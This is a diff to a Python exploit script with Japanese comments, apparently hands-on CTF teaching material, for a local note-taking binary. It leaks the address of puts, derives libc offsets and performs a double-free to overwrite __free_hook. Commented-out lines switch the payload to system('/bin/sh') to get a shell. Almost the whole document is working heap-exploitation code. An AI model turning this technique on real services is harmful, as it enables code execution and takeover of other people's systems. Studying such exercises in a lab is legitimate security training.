@@ -81,10 +81,26 @@ def delete_note(idx):
   return menu()
   
 
-#### plt/got, rop gadgets, symbs addrs and consts ####
-ofs_puts        = 0x06dfd0 # 後で消す. 
-ofs_malloc_hook = 0x3afc30 # 後で消す. 
-ofs_free_hook   = 0x3b18e8 # 後で消す. 
+## 環境確認用. 
+"""
+コンテナ内で下記のようになっていればOK
+# patchelf --print-interpreter ./handson2
+/tmp/ld-2.27
+# patchelf --print-rpath ./handson2
+/tmp
+"""
+
+"""
+root@2ec5251a0172:/ctf/work/handson2# nm -D /tmp/libc-2.27.so | grep -E -e 'V (__malloc_hook|__free_hook)' -e ' puts$' -e ' system$'
+00000000003b18e8 V __free_hook
+00000000003afc30 V __malloc_hook
+000000000006dfd0 W puts
+root@2ec5251a0172:/ctf/work/handson2# 
+"""
+ofs_malloc_hook = 0x3afc30  
+ofs_free_hook   = 0x3b18e8 
+ofs_puts        = 0x06dfd0 
+ofs_system      = 0x041770
 
 banner = 'test'
 HOST, PORT = '127.0.0.1', 1337 
@@ -92,25 +108,42 @@ HOST, PORT = '127.0.0.1', 1337
 logging.info(banner)
 s, f = sock(HOST, PORT)
 addr_puts = int(readline_after(f, ':').strip(), 16)
-dbg("addr_puts")
+dbg("addr_puts") 
 
-## resolve address ##
+## 各種実際に読み込まれたアドレスを解決 ##
 libc_base   = addr_puts - ofs_puts
 malloc_hook = libc_base + ofs_malloc_hook
 free_hook   = libc_base + ofs_free_hook
+libc_system = libc_base + ofs_system
 dbg("libc_base")
 dbg("malloc_hook")
 dbg("free_hook")
+dbg("libc_system")
 
+## ここからExploit ##
 A = create_note(0x10, b'A' * 0x0f)
+
+
+## double-free
 delete_note(A)
 delete_note(A)
+
+## 書き込む値はなにか？=>今回は__free_hook(freeした時に呼び出される関数ポインタ)
 create_note(0x10, pQ(free_hook) + b'\n')
-create_note(0x10, b'\n')
+create_note(0x10, b'JUNK\n')
+
+
+## mallocが返してきた__free_hookに値を書き込み. 
 create_note(0x10, pQ(0xdeadbeef) + b'\n')
+## シェル起動時は, system関数のアドレスで__free_hookを書き換え. (上の行をコメントアウト, 下の行をコメントイン)
+## create_note(0x10, pQ(libc_system) + b'\n')
+## B = create_note(0x10, '/bin/sh') ## 実行させたいのはsystem("/bin/sh")
+
+input('gdb?') ## デバッグ確認用: docker内コンソールから gdb -p $(pidof handson2)
 
 ## 書き換えた関数ポインタをトリガ. 
-input('gdb?')
 delete_note(A)
+## シェル起動時は, system関数のアドレスで__free_hookを書き換え. (上の行をコメントアウト, 下の行をコメントイン)
+# delete_note(B)
 
 shell(s)
